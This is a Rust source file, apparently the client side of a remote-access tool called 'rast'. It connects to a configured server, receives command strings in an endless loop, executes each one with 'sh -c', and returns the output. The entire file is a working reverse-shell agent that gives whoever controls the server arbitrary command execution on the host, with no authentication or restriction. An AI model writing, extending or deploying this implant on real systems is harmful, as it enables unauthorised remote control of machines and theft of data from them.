use std::{io::Result, net::SocketAddr, process::Command};

use rast::{
    protocols::{tcp::*, *},
    settings::*,
};

#[tokio::main]
async fn main() -> Result<()> {
    println!("Hello from client!");

    // TODO: add embedding during compile
    let conf = match Settings::new() {
        Ok(conf) => {
            println!("{:?}", conf);
            conf
        },
        Err(e) => {
            panic!("{:?}", e);
        },
    };

    let address = SocketAddr::new(conf.server.ip, conf.server.port);
    let mut client: Box<dyn ProtoClient<Conf = TcpConf>> =
        Box::new(TcpClient::new_client(address, None).await?);

    // let msg_s = "Checking in!";
    // client.send(msg_s.to_string()).await?;
    // println!("Message sent: {}", msg_s);

    loop {
        let cmd = client.recv().await?;
        let cmd = cmd.trim_end_matches('\0');

        let output = Command::new("sh").arg("-c").arg(cmd).output()?;
        let mut output = String::from_utf8_lossy(&output.stdout).to_string();

        if output.is_empty() {
            output.push('\n');
        }

        client.send(output).await?;
    }

    // Ok(())
}
